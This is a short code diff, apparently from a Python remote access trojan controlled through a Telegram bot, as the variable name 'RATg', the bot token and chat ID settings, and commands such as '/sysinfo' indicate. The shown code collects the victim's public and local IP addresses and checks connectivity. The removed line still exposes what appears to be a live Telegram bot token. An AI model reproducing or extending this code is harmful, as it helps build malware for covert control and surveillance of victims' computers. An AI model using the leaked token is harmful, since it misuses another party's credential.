@@ -23,7 +23,7 @@ if check_internret():
     keyboard = Hub.Keyboard()
     ip = requests.get("https://api.ipify.org/").text
     local_ip = os.Get_IP()
-    token = BOT_TOKEN # 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
+    token = BOT_TOKEN 
     id = TELEGRAM_ID
     commands = ["/check", 
                 "/sysinfo", 
@@ -59,8 +59,8 @@ if check_internret():
                     "AgentList":"Internet Explorer",
                     "VersionsList":"HTTP/1.1",
                     "MethodList":"GET"}
-            msg = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
-            if msg.status_code == 200: return True
+            RATg = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
+            if RATg.status_code == 200: return True
             else: return False
         except: return False
     def read_msg(token=token):
